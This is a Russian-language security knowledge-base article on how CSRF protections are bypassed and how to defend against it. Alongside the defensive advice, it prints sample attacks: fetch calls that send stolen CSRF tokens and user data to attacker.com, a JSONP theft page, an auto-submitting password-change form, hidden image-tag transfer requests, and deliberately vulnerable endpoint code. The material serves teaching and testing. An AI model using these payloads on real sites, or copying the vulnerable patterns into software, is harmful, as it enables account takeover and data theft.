---
aliases: ["CSRF Bypass", "Обход CSRF", "Атаки на CSRF защиту"]
tags:
  - security
  - csrf
  - web-security
  - attacks
  - bypass
  - protection
  - vulnerability
---

# Обход CSRF-защиты

## Введение в обход CSRF-защиты

> [!warning] Важно
> Данный материал предназначен для ознакомления с методами обхода CSRF-защиты с целью повышения уровня безопасности веб-приложений. Использование этих знаний в незаконных целях недопустимо.

CSRF (Cross-Site Request Forgery) - это тип атаки, при котором злонамеренный сайт заставляет браузер пользователя выполнить нежелательное действие на доверенном сайте, где пользователь аутентифицирован. Защита от CSRF-атак является важной частью безопасности веб-приложений, но, как и любая защита, она может быть обойдена при определенных условиях.

Обход CSRF-защиты происходит, когда атакующий находит способ обойти механизмы, предназначенные для предотвращения подобных атак. Это может быть связано с недостатками в реализации защиты, особенностями протокола HTTP или уязвимостями в самой архитектуре приложения.

## Общие принципы обхода

### Основные концепции

Обход CSRF-защиты основывается на следующих принципах:

1. **Неправильная проверка токенов** - если сервер не проверяет CSRF-токены должным образом, атака может быть успешной
2. **Ошибки в реализации SameSite-атрибута** - неправильная настройка cookie может ослабить защиту
3. **Недостаточная проверка заголовков** - если сервер полагается только на заголовки Origin или Referer, атакующий может их подделать
4. **Слабая привязка сессии к пользователю** - если сессия не привязана должным образом к пользователю, атака может пройти успешно

### Типичные ошибки разработчиков

- Использование одинаковых токенов для всех пользователей
- Неправильное хранение токенов на клиенте
- Отсутствие проверки токенов для определенных типов запросов
- Неправильная реализация защиты для API-эндпоинтов

## Методы обхода различных видов защиты

### Обход на основе токенов

Самый распространенный метод защиты от CSRF-атак - это использование CSRF-токенов. Однако этот метод может быть обойден несколькими способами:

- **Подделка токена** - если токен генерируется предсказуемым образом
- **Извлечение токена** - если токен доступен из другого источника (например, через XSS-атаку)
- **Отсутствие проверки** - если сервер не проверяет токен для определенных запросов

### Обход на основе заголовков

Некоторые приложения полагаются на заголовки `Origin` или `Referer` для проверки источника запроса. Однако эти заголовки могут быть:

- Опущены браузером в определенных случаях
- Подделаны в устаревших или небезопасных браузерах
- Недоступны в определенных сценариях (например, при переходе с HTTPS на HTTP)

### Обход на основе сессии

Если сессия пользователя не привязана должным образом к другим атрибутам (например, IP-адресу или User-Agent), атакующий может использовать валидную сессию, полученную другими способами.

## Атаки через GET-запросы

### Почему GET-запросы уязвимы

GET-запросы особенно уязвимы к CSRF-атакам, потому что:

- Они могут быть выполнены через теги `<img>`, `<iframe>`, `<link>` без участия JavaScript
- Браузер автоматически отправляет куки с GET-запросами
- Они не требуют специальных заголовков или настроек безопасности

### Пример уязвимого кода

```html
<!-- Уязвимый код -->
<img src="https://example.com/transfer?amount=1000&to=hacker">
```

Если приложение позволяет выполнять чувствительные операции через GET-запросы, злоумышленник может создать подобный код на своем сайте, и при посещении пользователем страницы будет выполнена операция от его имени.

### Рекомендации по предотвращению

- Не использовать GET-запросы для выполнения чувствительных операций
- Всегда использовать POST-запросы для изменяющих данные операций
- Реализовать CSRF-защиту для всех чувствительных эндпоинтов

## Обход SameSite-атрибута

### Понимание SameSite-атрибута

SameSite-атрибут cookie предназначен для предотвращения отправки cookie в межсайтовых запросах. Возможные значения:

- `Strict` - cookie отправляются только в рамках одного сайта
- `Lax` - cookie отправляются в ограниченном наборе межсайтовых сценариев (например, при переходе по ссылке)
- `None` - cookie отправляются во всех случаях (требует `Secure` флаг)

### Методы обхода SameSite-атрибута

#### 1. Эксплуатация Lax режима

Некоторые браузеры могут отправлять cookie с атрибутом `SameSite=Lax` в определенных сценариях:

- При переходе с внешнего сайта по ссылке
- При отправке POST-запросов с определенными Content-Type
- В некоторых случаях при использовании `<form>` элементов

#### 2. Устаревшие браузеры

Некоторые старые браузеры не поддерживают SameSite-атрибут или интерпретируют его по-разному, что может привести к обходу защиты.

#### 3. Ошибки в реализации

- Неправильная установка SameSite-атрибута для всех cookie
- Отсутствие SameSite-атрибута для важных cookie (например, сессионных)

## Обход CSRF-токенов

### Типичные уязвимости в реализации токенов

#### 1. Предсказуемые токены

Если токены генерируются с использованием слабого источника случайности, атакующий может предсказать следующий токен:

```javascript
// ПЛОХО: предсказуемый токен
function generateCSRFToken() {
  return Date.now().toString(); // Легко предсказуемый токен
}
```

#### 2. Повторное использование токенов

Если токен не меняется при каждом запросе или используется многократно, это создает уязвимость.

#### 3. Хранение токенов на клиенте

Если токены хранятся в localStorage, sessionStorage или в DOM, они могут быть извлечены через XSS-атаку.

### Методы обхода токенов

#### 1. Извлечение токена через XSS

Если на сайте существует XSS-уязвимость, атакующий может извлечь CSRF-токен и использовать его в атаке:

```javascript
// XSS-вектор для извлечения токена
var token = document.querySelector('input[name="csrf_token"]').value;
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: token
});
```

#### 2. Обход через JSONP

Некоторые реализации JSONP могут обойти CSRF-защиту, так как JSONP использует тег `<script>`, который не подвержен CSRF-ограничениям.

#### 3. Подделка токена

Если токен генерируется по предсказуемому алгоритму, атакующий может попытаться сгенерировать валидный токен.

## Обход заголовка Origin

### Понимание заголовка Origin

Заголовок `Origin` указывает источник запроса и может использоваться для проверки легитимности запроса. Однако этот метод защиты имеет ограничения:

- Заголовок `Origin` не отправляется во всех типах запросов
- Некоторые старые браузеры могут не отправлять этот заголовок
- Заголовок может быть подделан в определенных условиях

### Сценарии обхода

#### 1. Отсутствие заголовка Origin

Некоторые типы запросов (например, простые формы GET/POST) не отправляют заголовок `Origin`, что может обойти защиту.

#### 2. Подделка заголовка Origin

В определенных условиях атакующий может заставить браузер отправить поддельный заголовок `Origin`.

#### 3. Обработка отсутствующего заголовка

Если сервер не обрабатывает отсутствие заголовка `Origin` должным образом, это может привести к обходу защиты.

## Использование JSONP

### Что такое JSONP и почему он уязвим

JSONP (JSON with Padding) - это метод обхода Same-Origin Policy, который позволяет загружать данные с других доменов. Он работает путем динамического создания тега `<script>`, что делает его уязвимым для CSRF-атак, так как теги `<script>` не подвержены CSRF-ограничениям.

### Пример уязвимого JSONP-эндпоинта

```javascript
// Уязвимый JSONP-эндпоинт
app.get('/api/user', (req, res) => {
  const callback = req.query.callback || 'callback';
  const userData = getUserData(req.session.userId);
  res.send(`${callback}(${JSON.stringify(userData)})`);
});
```

### Атака через JSONP

```html
<script>
function attack(data) {
  // Злоумышленник получает доступ к данным пользователя
  fetch('https://attacker.com/collect', {
    method: 'POST',
    body: JSON.stringify(data)
  });
}
</script>
<script src="https://vulnerable-site.com/api/user?callback=attack"></script>
```

### Защита от JSONP-атак

- Избегать использования JSONP, использовать CORS вместо этого
- Проверять параметр callback на валидность
- Не передавать чувствительные данные через JSONP

## Обход через XSS

### Связь XSS и CSRF

XSS (Cross-Site Scripting) и CSRF часто связаны, так как XSS-атака может использоваться для обхода CSRF-защиты:

- Извлечение CSRF-токенов
- Выполнение запросов от имени пользователя
- Обход других механизмов защиты

### Пример комбинированной атаки

```javascript
// XSS-вектор, который извлекает CSRF-токен и выполняет CSRF-атаку
var token = document.querySelector('input[name="csrf_token"]').value;
fetch('https://vulnerable-site.com/transfer', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded',
  },
  body: `csrf_token=${token}&amount=1000&to=hacker`
});
```

### Защита от комбинированных атак

- Обеспечить защиту от XSS-атак
- Использовать Content Security Policy (CSP)
- Правильно кодировать вывод данных
- Проверять и валидировать все входные данные

## Атаки на уровне приложения

### Уязвимости в бизнес-логике

Некоторые CSRF-атаки эксплуатируют уязвимости в бизнес-логике приложения:

- Отсутствие дополнительной проверки для важных операций
- Недостаточная валидация параметров запроса
- Отсутствие ограничений на частоту операций

### Пример: Уязвимость в смене email

```javascript
// Уязвимый эндпоинт смены email
app.post('/change-email', (req, res) => {
  // Отсутствует проверка CSRF-токена!
  const newEmail = req.body.email;
  updateUserEmail(req.session.userId, newEmail);
  res.send('Email changed successfully');
});
```

### Защита на уровне приложения

- Валидация всех входных данных
- Проверка авторизации для каждой операции
- Использование принципа наименьших привилегий
- Логирование и мониторинг подозрительных действий

## Современные методы обхода

### Использование Service Workers

Service Workers могут быть использованы для перехвата и модификации запросов, что может обойти традиционные методы CSRF-защиты.

### Обход через межсайтовые скрипты

Современные браузеры имеют более сложные правила обработки межсайтовых запросов, которые могут быть эксплуатированы в определенных сценариях.

### Использование новых API

Некоторые новые веб-API могут обойти традиционные методы защиты, особенно если они не учитывают CSRF-угрозы.

## Практические примеры

### Пример 1: Уязвимый веб-сайт с формой перевода денег

Представим веб-сайт банковского приложения с формой перевода денег:

```html
<form action="/transfer" method="POST">
  <input type="hidden" name="amount" value="1000">
  <input type="hidden" name="to_account" value="hacker_account">
  <input type="submit" value="Получить бонус">
</form>
```

Если приложение не использует CSRF-токены или другие методы защиты, злоумышленник может создать подобную форму на своем сайте и заманить пользователя на посещение, что приведет к выполнению перевода от его имени.

### Пример 2: Обход через IMG-тег

```html
<img src="https://bank.com/transfer?amount=1000&to=hacker" width="0" height="0">
```

Если операция перевода денег доступна через GET-запрос, такой код может выполнить перевод при загрузке страницы пользователем.

### Пример 3: Обход SameSite=Lax

Предположим, сайт использует `SameSite=Lax` для сессионных cookie. Атакующий может создать форму, которая отправляется как POST-запрос с определенным Content-Type, что может обойти защиту в некоторых браузерах:

```html
<form action="https://vulnerable-site.com/change-password" method="POST" enctype="text/plain">
  <input name='{"password": "hacker123", "csrf_token": "fake_token"}' value=''>
  <input type="submit" value="Submit">
</form>
<script>
document.forms[0].submit();
</script>
```

## Как защититься от обходов

### Многоуровневая защита

Для эффективной защиты от обходов CSRF-защиты рекомендуется использовать комбинацию методов:

1. **CSRF-токены** - генерировать уникальные токены для каждой формы/сессии
2. **SameSite-атрибуты** - правильно настраивать cookie с атрибутом SameSite
3. **Проверка Origin/Referer** - дополнительная проверка источника запроса
4. **Ограничение по времени** - токены с ограниченным временем жизни
5. **Дополнительная аутентификация** - для чувствительных операций

### Лучшие практики реализации

#### 1. Генерация безопасных токенов

```javascript
const crypto = require('crypto');

function generateCSRFToken(sessionId) {
  const randomBytes = crypto.randomBytes(32);
  return crypto
    .createHash('sha256')
    .update(randomBytes)
    .update(sessionId)
    .digest('hex');
}
```

#### 2. Правильная проверка токенов

```javascript
app.use('/api/*', (req, res, next) => {
  const token = req.headers['x-csrf-token'] || req.body._csrf;
  const expectedToken = req.session.csrfToken;

  if (token !== expectedToken) {
    return res.status(403).send('CSRF token mismatch');
  }

  next();
});
```

#### 3. Использование Double Submit Cookie

```javascript
// Установка CSRF-куки
app.use((req, res, next) => {
  if (!req.cookies.csrfToken) {
    const token = crypto.randomBytes(32).toString('hex');
    res.cookie('csrfToken', token, {
      httpOnly: false, // Должна быть доступна для JavaScript
      secure: true,
      sameSite: 'strict'
    });
    req.csrfToken = token;
  } else {
    req.csrfToken = req.cookies.csrfToken;
  }
  next();
});
```

### Мониторинг и аудит

- Регулярный аудит кода на наличие уязвимостей
- Мониторинг подозрительных запросов
- Логирование CSRF-ошибок
- Использование автоматизированных инструментов тестирования

## Тестирование на уязвимости обхода

### Ручное тестирование

#### 1. Проверка на использование GET для чувствительных операций

Попробуйте выполнить чувствительные операции (например, смену пароля, перевод денег) через GET-запросы.

#### 2. Проверка отсутствия CSRF-токенов

Попробуйте выполнить POST-запросы без CSRF-токенов или с поддельными токенами.

#### 3. Проверка SameSite-атрибута

Проверьте, как приложение ведет себя при различных значениях SameSite-атрибута.

### Автоматизированные инструменты

- OWASP ZAP
- Burp Suite
- CSRFTester
- Custom fuzzing scripts

### Пентестинг сценарии

#### Сценарий 1: Проверка формы смены email

1. Аутентифицируйтесь на сайте
2. Найдите форму смены email
3. Проверьте, используется ли CSRF-токен
4. Попробуйте отправить запрос без токена или с поддельным токеном

#### Сценарий 2: Проверка атаки через IMG-тег

1. Попробуйте выполнить чувствительную операцию через GET-запрос
2. Создайте HTML-страницу с IMG-тегом, который вызывает операцию
3. Проверьте, выполняется ли операция при загрузке страницы

## Ссылки на другие связанные файлы

- [[CSRF-защита]]
- [[XSS-защита]]
- [[HTTP-Security-Headers]]
- [[Content-Security-Policy]]
- [[Управление-сессиями-и-аутентификацией]]
- [[Безопасность-в-веб-приложениях-для-детей]]
- [[Безопасность-в-веб-приложениях-с-AI-ML]]
- [[Тестирование-безопасности]]
- [[Аудит-безопасности]]
- [[Защита-от-атак-на-уровне-браузера]]
- [[Secure-Coding-Practices]]
- [[Ограничение-доступа-к-API]]
- [[Управление-доступом]]
- [[Clickjacking-защита]]
- [[Dependency-Security]]
- [[Secure-Storage]]
- [[Формирование-безопасного-кода-на-фронте]]
- [[Работа-с-уязвимыми-пользователями]]
- [[SameSite-атрибут]]
- [[SameSite-куки]]
- [[Double-Submit-Cookie]]
- [[Токены-анти-CSRF]]
- [[Методы-защиты-от-CSRF]]
- [[Типы-CSRF-атак]]
- [[Безопасность-в-браузере]]
- [[Безопасность-в-веб-приложениях-для-детей]]
- [[Безопасность-в-веб-приложениях-с-AI-ML]]
- [[Безопасность-в-веб-приложениях-с-P2P-коммуникациями]]
- [[Безопасность-в-микросервисной-архитектуре]]
- [[Безопасность-в-облачных-средах]]
- [[Безопасность-в-системах-с-несколькими-доменами]]
- [[Безопасность-в-системах-с-поддержкой-камеры-и-микрофона]]
- [[Безопасность-в-системах-с-поддержкой-плагинов]]
- [[Безопасность-в-системах-с-drag-and-drop-файлов]]
- [[Безопасность-в-системах-с-push-уведомлениями]]
- [[Безопасность-в-системах-i18n]]
- [[Безопасность-в-CMS]]
- [[Безопасность-в-SPA]]
- [[Безопасность-в-third-party-integrations]]
- [[Безопасность-в-VR-AR-приложениях]]
- [[Безопасность-веб-компонентов]]
- [[Безопасность-веб-сокетов]]
- [[Безопасность-данных-в-реальном-времени]]
- [[Безопасность-платежных-форм]]
- [[Безопасность-при-работе-с-геолокацией]]
- [[Безопасность-файлов-конфигурации]]
- [[Безопасность-форм]]
- [[Безопасность-PWA]]
- [[Защита-от-инъекций]]
- [[Защита-от-фишинга]]
- [[Идентификация-и-отслеживание-угроз]]
- [[Инцидент-менеджмент-на-фронтенде]]
- [[Использование-WebAssembly-безопасно]]
- [[Контроль-доступа-к-данным-в-браузере]]
- [[Меры-против-ботов]]
- [[Мониторинг-безопасности]]
- [[Мониторинг-безопасности-в-продакшене]]
- [[Обнаружение-и-предотвращение-брутфорса]]
- [[Обработка-персональных-данных]]
- [[Обфускация-и-защита-исходного-кода]]
- [[Ограничение-доступа-к-API]]
- [[Ограничение-ресурсов-и-защита-от-злоупотреблений]]
- [[Основы-веб-безопасности]]
- [[Отладка-безопасности]]
- [[Политики-безопасности-для-файлов]]
- [[Работа-с-уязвимыми-пользователями]]
- [[Снижение-влияния-на-производительность]]
- [[Снижение-рисков-в-DevTools]]
- [[Снижение-рисков-при-работе-с-cookies]]
- [[Сниффинг-и-защита-от-него]]
- [[Тестирование-безопасности]]
- [[Управление-доступом]]
- [[Управление-сессиями-и-аутентификацией]]
- [[Шифрование-на-клиенте]]
- [[Этические-аспекты-безопасности]]

## Заключение

Обход CSRF-защиты требует глубокого понимания как механизмов защиты, так и возможных уязвимостей в их реализации. Разработчики должны использовать многоуровневый подход к защите, регулярно обновлять свои знания о новых методах атак и проводить регулярные аудиты безопасности своих приложений.

Важно помнить, что защита от CSRF - это не разовое действие, а постоянный процесс, требующий внимания ко всем аспектам безопасности веб-приложения.

## Теги

#security #csrf #web-security #attacks #bypass #protection #vulnerability #samesite #csrf-token #web-development #security-audit #penetration-testing #same-site-attribute #double-submit-cookie #xss #jsonp #origin-header #referer-header